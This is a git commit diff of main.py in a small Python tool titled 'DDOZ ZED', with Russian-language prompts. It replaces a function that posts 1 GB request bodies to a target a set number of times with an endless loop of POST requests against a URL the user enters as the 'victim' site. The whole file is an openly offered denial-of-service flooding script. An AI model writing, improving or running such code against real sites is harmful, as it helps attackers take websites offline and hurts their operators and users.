3eb49b27f4924560d39b5b276c3cecfaab95ce99
flask357 <143599972+flask357@users.noreply.github.com>
2024-10-12 14:40:35 +0300

    Update main.py

--- main.py
+++ main.py
@@ -1,29 +1,23 @@
 from pyfiglet import Figlet
 import requests
 
-def ddos_attack(url, count_request):    
-    for i in range(count_request):
-        try:
 
-            data = "A" * 1024 * 1024 * 1024  
-            response = requests.post(url, data=data)
-            print(f"Запрос {i+1} отправлен. Код ответа: {response.status_code}")
-        except requests.exceptions.RequestException as e:
-            print(f"Ошибка при отправке запроса {i+1}: {e}")
+def main():
+  n = 0
+  preview_text = Figlet(font='slant')
+  print(preview_text.renderText('DDOZ ZED'))
+
+  data = 'a'
+  url = input("Введите ссылку на сайт который является жертвой: ")
+  print("Нажмите Ctrl + C для завершения ппрограммы!")
+  while True:
+    response = requests.post(url, data=data)
+    n += 1
+    response.status_code
+    print(f"{n} пакетов отправлено")
+
 
 if __name__ == "__main__":
-    preview_text = Figlet(font='slant')
-    print(preview_text.renderText('DDOZ ZED'))
-
-    url = input("Укажите ip адрес сайта который является целью: ")
-    count_request = int(input("Укажите количество запросов: "))
-    print("Рекомендуется не завершать программу и не выключать устройство во время работы!")
-
-    ddos_attack(url, count_request)
-    print("Все запросы отправлены!")
+  main()
  
-
-  
- 
-
 
